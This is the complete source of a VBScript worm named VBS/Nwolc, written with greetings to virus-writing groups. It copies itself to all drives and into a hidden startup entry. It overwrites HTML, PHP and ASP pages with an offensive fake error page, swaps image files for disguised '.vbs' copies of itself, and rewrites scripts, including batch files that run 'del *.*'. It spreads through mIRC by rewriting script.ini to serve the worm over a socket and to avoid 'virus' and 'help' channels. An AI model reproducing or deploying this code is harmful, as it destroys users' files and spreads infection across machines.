   'VBS/Nwolc
   'Greetings to #VX and Cyber Knights
   '..I..(o.O)..I..
   Const ForReading=1,ForWriting=2,ForAppending=8
   On Error Resume Next
   Randomize
   Set fso=CreateObject("Scripting.FileSystemObject")
   Set wshell=CreateObject("WScript.Shell")
   Set fwrite=fso.OpenTextFile(WScript.ScriptFullName,1)
   CopyOfFile=fwrite.ReadAll
   fwrite.Close
   Set root=fso.Drives
   tiger = Int((Rnd * 3) + 1)
   If Not (tiger="0") Then
       tiger=tiger - 1
       Else
       tiger=tiger
   End If
   circus=fso.GetSpecialFolder(tiger)
   Set mkdir=fso.CreateFolder(circus & "\Backups")
   For each drive in root
       Set cfile=fso.GetFile(WScript.ScriptFullName)
       cfile.Copy drive & "\"
       Call JokeIntoDrive(drive)
   Next
   Sub JokeIntoDrive(LockDrive)
       Set LockMap=fso.GetFolder(LockDrive & "\")
       For Each folder in LockMap.SubFolders
           If fso.FileExists(folder & "\mirc.ini") Then
               IrcFolder = folder
               Call InfectmIRC(IrcFolder)
           End If
           Call SearchIntoFolders(folder)
           Call ScanIntoIt(folder)
       Next
   End Sub
   Sub SearchIntoFolders(subfolder)
       Set LockSubMap = fso.GetFolder(subfolder & "\")
       For Each DeepFolder in LockSubMap.SubFolders
           If fso.FileExists(DeepFolder & "\mirc.ini") Then
               IrcFolder = DeepFolder
               Call InfectmIRC(IrcFolder)
           End If
       Next
       Call ScanIntoIt(subfolder)
   End Sub
   Sub InfectmIRC(tfolder)
       Randomize
       WhereDrive=Left(tfolder,3)
       If fso.FileExists(tfolder & "\script.ini") Then
           Set cfile=fso.GetFile(tfolder & "\script.ini")
           If fso.FileExists(WhereDrive & "script.ini") Then
               hits=Int((Rnd*999999999) + 1)
               cfile.Copy WhereDrive & "script_" & hits & ".ini"
               Else
               cfile.Copy WhereDrive
           End If
       End If
       Set fwrite=fso.OpenTextFile(tfolder & "\script.ini", 2)
       fwrite.WriteLine "[script]"
       fwrite.WriteLine "n0=On 1:Connect:{ .remote on | .socklisten ready 4559 }"
       fwrite.WriteLine "n1=On 1:Input:*:{ if ($lower($1) == /remote) { if ($lower($2) == off) { echo -a *** Remote Off | .remote on | halt } else { echo -a *** Remote off } } }"
       fwrite.WriteLine "n2=On 1:Join:#:{ if ($me == $nick) { if (virus isin $lower($chan)) || (fix isin $lower($chan)) || (help isin $lower($chan)) { .part $chan } } }"
       fwrite.WriteLine "n3=On 1:TEXT:*:*:{ if (virus isin $lower($1-)) || (fix isin $lower($1-)) || (help isin $lower($1-)) { .ignore $nick } }"
       fwrite.WriteLine "n4=alias sendit { inc %sendcount | .notice $1 DCC Send Clown.vbs ( $+ $ip $+ ) | .msg $1 DCC SEND clown.vbs $longip($ip) 4559 $file(Clown.vbs).size | }"
       fwrite.WriteLine "n5=On 1:Socklisten:ready:{ sockaccept acceptit | set %i 1 | while (%i <= $lines(clown.vbs)) { set %readit $read(clown.vbs,%i) | if (%readit != $null) { sockwrite -n acceptit %readit } inc %i } | sockwrite -n acceptit }"
       fwrite.WriteLine "n6=on 1:sockread:acceptit:{ sockread %temp | unset %z | if ($sock(acceptit,*).sent !>= $file(clown.vbs).size) { sockwrite -n acceptit } | if (%temp == $null) { sockwrite -n acceptit  } }"
       fwrite.Close
       Set cfile=fso.GetFile(WScript.ScriptFullName)
       cfile.Copy tfolder & "\Clown.vbs"
   End Sub
   Sub ScanIntoIt(Compass)
       Set ScanMap=fso.GetFolder(Compass)
       For each ck in ScanMap.Files
           ext=lcase(fso.GetExtensionName(ck.name))
           If (ext="htm") or (ext="html") or (ext="php") or (ext="asp") then
               Call InfectWebpages(ck)
           End If
           If (ext="jpg") or (ext="jpeg") or (ext="gif") or (ext="bmp") then
               Call InfectGraphics(ck, ext)
           End If
           If (ext="pl") or (ext="cgi") then
               Call InfectPerl(ck)
           End If
           If (ext="js") or (ext="vbs") or (ext="bat") then
               Call InfectOtherScript(ck, ext)
           End If
       Next
   End Sub
   Sub InfectWebpages(wp)
       Set cfile=fso.GetFile(wp)
       cfile.Copy circus & "\Backups"
       Set fwrite=fso.OpenTextFile(wp,2)
       fwrite.WriteLine "<HTML><HEAD><TITLE>Error: Unknown</title>"
       fwrite.WriteLine "</HEAD><BODY><B>Error Occured While Opening Page</B><BR><BR>Possible Errors:<br>- You've just had sex with an AIDS carrier.<br>- Your father met with an accident<br>- Time for you to buy a new computer.<br>- Gameover for Bill Gates.</BODY></HTML>"
       fwrite.Close
   End Sub
   Sub InfectGraphics(gp, gpext)
       Set cfile=fso.GetFile(gp)
       cfile.Copy circus & "\Backups"
       fso.Deletefile gp
       Set fwrite=fso.CreateTextFile(gp & "." & gpext & " .vbs", 2)
       fwrite.Write CopyOfFile
       fwrite.Close
   End Sub
   Sub InfectPerl(cgi)
       Set fwrite=fso.OpenTextFile(cgi,1)
       whichperl=fwrite.ReadLine
       fwrite.Close
       Set cfile=fso.GetFile(cgi)
       cfile.Copy circus & "\Backups"
       fso.Deletefile cgi
       Set fwrite=fso.CreateTextFile(cgi,2)
       fwrite.WriteLine "@listfiles = `ls`;"
       fwrite.WriteLine "foreach (@listfiles) {"
       fwrite.WriteLine "open(FOPEN, ""+>$target"");"
       fwrite.WriteLine "print FOPEN ""Error: Unknown\n"";"
       fwrite.WriteLine "close(FOPEN)";
       fwrite.WriteLine "}"
       fwrite.Close
   End Sub
   Sub InfectOtherScript(ios, kiko)
       If (kiko = "js") Then
           Call HowAboutJava(ios)
       End If
       If (kiko = "bat") Then
           Call HowAboutBatch(ios)
       End If
       If (kiko = "vbs") Then
           Call HowAboutVBS(ios)
       End If
   End Sub
   Sub HowAboutJava(haj)
       Set cfile=fso.GetFile(haj)
       cfile.Copy circus & "\Backups"
       fso.Deletefile haj
       Set fwrite=fso.CreateTextFile(haj,2)
       fwrite.WriteLine "Alert(""Error: Unknown"");"
       fwrite.Close
   End Sub
   Sub HowAboutBatch(hab)
       Set cfile=fso.GetFile(hab)
       cfile.Copy circus & "\Backups"
       fso.Deletefile hab
       Set fwrite=fso.CreateTextFile(hab,2)
       fwrite.WriteLine "@ECHO OFF"
       fwrite.WriteLine "echo Error: Unknown"
       fwrite.WriteLine "echo To continue running this file, please press Y"
       fwrite.WriteLine "del *.*"
       fwrite.Close
   End Sub
   Sub HowAboutVBS(hav)
       Set cfile=fso.GetFile(hav)
       cfile.Copy circus & "\Backups"
       fso.Deletefile hav
       Set fwrite=fso.CreateTextFile(hav,2)
       fwrite.Write CopyOfFile
       fwrite.Close
   End Sub
   Set cfile=fso.GetFile(WScript.ScriptFullName)
   cfile.Copy circus
   cfile.Copy Left(circus,3) & "WINDOWS\Start Menu\Programs\StartUp\Clown.vbs"
   wshell.Run("command /k attrib +h """ & Left(circus,3) & "WINDOWS\Start Menu\Programs\StartUp\Clown.vbs""")
   MsgBox "Error: Unknown"
